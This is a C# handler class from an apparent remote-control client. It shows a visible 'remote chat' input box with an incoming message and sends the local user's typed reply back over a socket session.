using System;
using System.Threading;
using Microsoft.VisualBasic;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestRemoteChatHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                var resp = new ResponseRemoteChat();
                try
                {
                    var req = reqObj as RequestRemoteChat;
                    if (req == null)
                        return;

                    resp.RequestMessage = req.Message;
                    string reply = string.Empty;
                    Thread inputThread = new Thread(() =>
                    {
                        reply = Interaction.InputBox(req.Message ?? string.Empty, "远程聊天", string.Empty);
                    });
                    inputThread.SetApartmentState(ApartmentState.STA);
                    inputThread.Start();
                    inputThread.Join();
                    resp.Reply = reply;
                    resp.Result = true;
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.Message;
                }

                session.Send(ePacketType.PACKET_REMOTE_CHAT_RESPONSE, resp);
            });
        }
    }
}
